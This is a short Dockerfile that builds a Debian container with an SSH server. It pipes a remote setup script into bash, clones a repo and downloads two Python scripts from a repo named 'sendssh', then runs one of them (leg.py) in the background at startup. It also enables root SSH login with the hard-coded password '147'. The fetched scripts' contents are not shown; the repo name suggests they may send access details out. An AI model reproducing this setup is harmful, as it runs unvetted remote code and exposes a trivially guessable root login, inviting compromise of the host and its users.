FROM debian
ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt upgrade -y && apt install -y \
    openssh-server git wget sudo nano curl python3 python3-pip \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/x011-al/nbwc

RUN wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/leg.py \
    && wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/cgn.py

RUN mkdir /run/sshd \
    && echo "sleep 5" >> /openssh.sh \
    && echo "python3 leg.py &" >> /openssh.sh \
    && echo "/usr/sbin/sshd -D" >> /openssh.sh \
    && echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
    && echo "root:147" | chpasswd \
    && chmod 755 /openssh.sh

ENTRYPOINT ["/openssh.sh"]
